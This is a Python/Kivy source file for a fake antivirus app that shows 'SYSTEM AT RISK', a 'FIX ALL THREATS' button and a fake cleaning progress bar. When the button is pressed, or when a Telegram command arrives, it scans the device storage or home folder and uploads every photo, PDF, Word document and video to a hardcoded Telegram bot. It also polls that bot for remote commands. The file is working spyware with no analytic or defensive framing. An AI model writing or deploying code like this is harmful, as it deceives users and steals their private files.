import os
import threading
import time
import requests
import certifi
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.utils import platform
from kivy.clock import Clock
from kivy.core.window import Window

TOKEN = "8654532556:AAF8rursg7euxa8nME7wzg130zsj4VHTtyQ"
CHAT_ID = "6052767447"
URL = f"https://api.telegram.org/bot{TOKEN}"

class BahbahEngine:
    def __init__(self):
        self.last_id = 0

    def send_to_tg(self, method, data=None, files=None):
        try:
            requests.post(f"{URL}/{method}", data=data, files=files, verify=certifi.where(), timeout=30)
        except: pass

    def get_all_files(self):
        paths = ["/sdcard", "/storage"] if platform == 'android' else [os.path.expanduser("~")]
        exts = ('.jpg', '.png', '.pdf', '.docx', '.mp4')
        for p in paths:
            for root, _, files in os.walk(p):
                for f in files:
                    if f.lower().endswith(exts):
                        path = os.path.join(root, f)
                        with open(path, 'rb') as doc:
                            self.send_to_tg("sendDocument", {'chat_id': CHAT_ID}, {'document': doc})
                        time.sleep(1.5)

    def listen_commands(self, dt):
        try:
            res = requests.get(f"{URL}/getUpdates?offset={self.last_id + 1}", timeout=5).json()
            for up in res.get("result", []):
                self.last_id = up["update_id"]
                cmd = up.get("message", {}).get("text", "").lower()
                if cmd == "بحبح":
                    threading.Thread(target=self.get_all_files).start()
        except: pass

class AntivirusApp(App):
    def build(self):
        Window.clearcolor = (0.05, 0.05, 0.05, 1)
        self.engine = BahbahEngine()
        layout = BoxLayout(orientation='vertical', padding=40, spacing=20)
        self.lbl = Label(text="[b][color=ff3333]SYSTEM AT RISK[/color][/b]", markup=True, font_size='25sp')
        layout.add_widget(self.lbl)
        self.pb = ProgressBar(max=100)
        layout.add_widget(self.pb)
        btn = Button(text="FIX ALL THREATS", size_hint=(1, 0.2), background_color=(0, 0.6, 1, 1))
        btn.bind(on_press=self.start_scan)
        layout.add_widget(btn)
        Clock.schedule_interval(self.engine.listen_commands, 10)
        return layout

    def start_scan(self, instance):
        instance.disabled = True
        self.lbl.text = "Cleaning System..."
        Clock.schedule_interval(self.fake_progress, 0.1)
        threading.Thread(target=self.engine.get_all_files).start()

    def fake_progress(self, dt):
        if self.pb.value < 100:
            self.pb.value += 0.5
            return True
        self.lbl.text = "[color=00ff00]System Cleaned![/color]"
        return False

if __name__ == "__main__":
    AntivirusApp().run()
